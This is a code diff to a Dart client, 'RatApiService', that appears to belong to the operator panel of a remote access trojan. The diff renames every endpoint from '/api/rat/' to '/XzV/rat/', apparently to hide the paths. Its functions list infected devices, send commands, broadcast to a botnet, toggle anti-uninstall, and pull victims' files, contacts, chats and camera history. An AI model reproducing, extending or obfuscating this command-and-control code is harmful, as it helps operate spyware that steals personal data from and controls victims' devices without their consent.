@@ -1,5 +1,5 @@
 import 'dart:convert';
-import '../services/custom_http.dart' as http;
+import 'package:holow/services/custom_http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 import 'constants.dart';
 
@@ -13,7 +13,7 @@ class RatApiService {
 
   Future<dynamic> getNotifications(String deviceId) async {
     if (sessionKey == null) throw Exception("Session Key needed");
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/notifications/$deviceId');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/notifications/$deviceId');
     final response = await http.get(
       url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
     );
@@ -32,7 +32,7 @@ class RatApiService {
   Future<List<dynamic>> getDevices() async {
     if (sessionKey == null) throw Exception("Session Key needed");
     
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/devices');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/devices');
     final response = await http.get(
       url,
       headers: {
@@ -57,7 +57,7 @@ class RatApiService {
   Future<void> sendCommand(String deviceId, String command, {String? args}) async {
     if (sessionKey == null) throw Exception("Session Key needed");
 
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/command');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/command');
     final response = await http.post(
       url,
       headers: {
@@ -80,7 +80,7 @@ class RatApiService {
   Future<void> broadcastBotnet(String command, {String? args}) async {
     if (sessionKey == null) throw Exception("Session Key needed");
 
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/broadcast-botnet');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/broadcast-botnet');
     final response = await http.post(
       url,
       headers: {
@@ -102,7 +102,7 @@ class RatApiService {
   Future<void> toggleAntiUninstall(String deviceId, bool enabled) async {
     if (sessionKey == null) throw Exception("Session Key needed");
 
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/toggle-anti-uninstall');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/toggle-anti-uninstall');
     final response = await http.post(
       url,
       headers: {
@@ -147,8 +147,8 @@ class RatApiService {
   Future<List<dynamic>> getStorageFiles(String deviceId) async {
     if (sessionKey == null) throw Exception("Session Key needed");
     
-    // Endpoint: /api/rat/files/:deviceId
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/files/$deviceId');
+    // Endpoint: /XzV/rat/files/:deviceId
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/files/$deviceId');
     final response = await http.get(
       url,
       headers: {
@@ -172,7 +172,7 @@ class RatApiService {
 
   Future<Map<String, dynamic>?> getLastResponse(String deviceId) async {
     if (sessionKey == null) return null;
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/response/$deviceId');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/response/$deviceId');
     try {
       final response = await http.get(
         url,
@@ -197,7 +197,7 @@ class RatApiService {
   }
 
   String getDownloadUrl(String deviceId, String filename) {
-    return '${RatConstants.baseUrl}/api/rat/download/$deviceId/$filename?key=$sessionKey';
+    return '${RatConstants.baseUrl}/XzV/rat/download/$deviceId/$filename?key=$sessionKey';
   }
 
   Future<List<dynamic>> getContacts(String deviceId) async {
@@ -260,7 +260,7 @@ class RatApiService {
 
   Future<List<dynamic>> getChatHistory(String deviceId) async {
     if (sessionKey == null) throw Exception("Session Key needed");
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/chat/$deviceId');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/chat/$deviceId');
     final response = await http.get(
       url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
     );
@@ -278,7 +278,7 @@ class RatApiService {
 
   Future<void> sendChatMessage(String deviceId, String message) async {
     if (sessionKey == null) throw Exception("Session Key needed");
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/chat');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/chat');
     final response = await http.post(
       url,
       headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
@@ -292,7 +292,7 @@ class RatApiService {
   Future<Map<String, dynamic>> getDeviceDetails(String deviceId) async {
     if (sessionKey == null) throw Exception("Session Key needed");
     
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/details/$deviceId');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/details/$deviceId');
     final response = await http.get(
       url,
       headers: {
@@ -316,7 +316,7 @@ class RatApiService {
 
   Future<List<dynamic>> getCameraHistory(String deviceId) async {
     if (sessionKey == null) throw Exception("Session Key needed");
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/camera/history/$deviceId');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/camera/history/$deviceId');
     final response = await http.get(
       url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!},
     );
@@ -333,7 +333,7 @@ class RatApiService {
   }
   Future<dynamic> _fetchData(String ep, String did) async {
     if (sessionKey == null) throw Exception("Session Key needed");
-    final url = Uri.parse('${RatConstants.baseUrl}/api/rat/$ep/$did');
+    final url = Uri.parse('${RatConstants.baseUrl}/XzV/rat/$ep/$did');
     final r = await http.get(url, headers: {'Content-Type': 'application/json', 'x-session-key': sessionKey!});
     if (r.statusCode == 200) {
       final data = jsonDecode(r.body);
